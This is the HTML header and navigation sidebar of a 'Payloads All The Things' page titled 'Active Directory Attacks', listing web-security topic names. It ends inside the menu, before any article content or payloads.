
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../../LaTeX%20Injection/">
      
      
        <link rel="next" href="../Bind%20Shell%20Cheatsheet/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.1">
    
    
      
        <title>Active Directory Attacks - Payloads All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.402914a4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.a0c5b2b5.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#active-directory-attacks" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Payloads All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Active Directory Attacks
            
          </span>
        </div>
      </div>
    </div>
    
      <form class="md-header__option" data-md-component="palette">
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
          
            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
          
            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
      </form>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Payloads All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Payloads All The Things
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../CONTRIBUTING/" class="md-nav__link">
        CONTRIBUTING
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          API Key Leaks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          API Key Leaks
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
        API Key Leaks
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          AWS Amazon Bucket S3
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          AWS Amazon Bucket S3
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
        Amazon Bucket S3 AWS
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
      
      
      
        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
          Account Takeover
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Account Takeover
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Account%20Takeover/" class="md-nav__link">
        Account Takeover
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
      
      
      
        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
          Argument Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Argument Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Argument%20Injection/" class="md-nav__link">
        Argument Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
      
      
      
        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
          CORS Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          CORS Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
        CORS Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
      
      
      
        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
          CRLF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          CRLF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CRLF%20Injection/" class="md-nav__link">
        Carriage Return Line Feed
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
      
      
      
        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
          CSRF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          CSRF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSRF%20Injection/" class="md-nav__link">
        Cross-Site Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
      
      
      
        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
          CSV Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_10">
          <span class="md-nav__icon md-icon"></span>
          CSV Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSV%20Injection/" class="md-nav__link">
        CSV Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
          CVE Exploits
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11">
          <span class="md-nav__icon md-icon"></span>
          CVE Exploits
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/" class="md-nav__link">
        Common Vulnerabilities and Exposures
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
        CVE-2021-44228 Log4Shell
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
      
      
      
        <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
          Command Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_12">
          <span class="md-nav__icon md-icon"></span>
          Command Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Command%20Injection/" class="md-nav__link">
        Command Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
      
      
      
        <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
          DNS Rebinding
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_13">
          <span class="md-nav__icon md-icon"></span>
          DNS Rebinding
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../DNS%20Rebinding/" class="md-nav__link">
        DNS Rebinding
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
      
      
      
        <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
          Dependency Confusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_14">
          <span class="md-nav__icon md-icon"></span>
          Dependency Confusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Dependency%20Confusion/" class="md-nav__link">
        Dependency Confusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
      
      
      
        <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
          Directory Traversal
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_15">
          <span class="md-nav__icon md-icon"></span>
          Directory Traversal
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Directory%20Traversal/" class="md-nav__link">
        Directory Traversal
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
      
      
      
        <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
          File Inclusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_16">
          <span class="md-nav__icon md-icon"></span>
          File Inclusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../File%20Inclusion/" class="md-nav__link">
        File Inclusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
      
      
      
        <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
          GraphQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_17">
          <span class="md-nav__icon md-icon"></span>
          GraphQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../GraphQL%20Injection/" class="md-nav__link">
        GraphQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
      
      
      
        <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
          HTTP Parameter Pollution
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_18">
          <span class="md-nav__icon md-icon"></span>
          HTTP Parameter Pollution
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
        HTTP Parameter Pollution
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
      
      
      
        <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
          Insecure Deserialization
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_19">
          <span class="md-nav__icon md-icon"></span>
          Insecure Deserialization
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
        Insecure Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/DotNET/" class="md-nav__link">
        .NET Serialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
        Java Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Node/" class="md-nav__link">
        Node Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
        PHP Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
        Python Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
        Ruby Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/YAML/" class="md-nav__link">
        YAML Deserialization
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
      
      
      
        <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
          Insecure Direct Object References
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_20">
          <span class="md-nav__icon md-icon"></span>
          Insecure Direct Object References
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
        Insecure Direct Object References
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
      
      
      
